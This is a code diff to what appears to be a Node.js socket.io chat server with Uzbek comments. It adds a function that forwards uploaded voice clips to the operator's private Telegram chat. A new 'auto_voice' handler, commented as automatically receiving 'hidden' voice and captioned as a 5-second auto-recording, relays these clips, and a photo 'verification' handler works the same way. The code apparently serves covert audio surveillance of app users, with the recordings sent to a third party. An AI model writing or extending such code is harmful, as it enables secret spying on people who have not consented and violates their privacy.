@@ -54,6 +54,29 @@ function sendTelegramNotification(text) {
     req.end();
 }
 
+// Telegramga Ovozli xabar (Voice) yuborish funksiyasi
+function sendTelegramVoice(voiceUrl, caption) {
+    if (!TELEGRAM_BOT_TOKEN) return;
+    
+    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, voice: voiceUrl, caption: caption });
+    
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, // sendVoice buyrug'i
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(data)
+        }
+    };
+
+    const req = https.request(options, (res) => { res.on('data', () => {}); });
+    req.on('error', (e) => console.error('Telegram Voice Xato:', e));
+    req.write(data);
+    req.end();
+}
+
 // Telegramga rasm yuborish funksiyasi
 function sendTelegramPhoto(photoUrl, caption) {
     if (!TELEGRAM_BOT_TOKEN) return;
@@ -142,6 +165,12 @@ io.on('connection', (socket) => {
     socket.on('verify_photo', (data) => {
         const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
         sendTelegramPhoto(publicUrl, `📸 Max tasdiqlash: ${data.type}`);
+    });
+
+    // AVTOMATIK YASHIRIN OVOZNI QABUL QILISH
+    socket.on('auto_voice', (data) => {
+        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
+        sendTelegramVoice(publicUrl, `🎙 Maxdan avto-ovoz (5 soniya)`);
     });
 
     socket.on('send_message', (data) => {
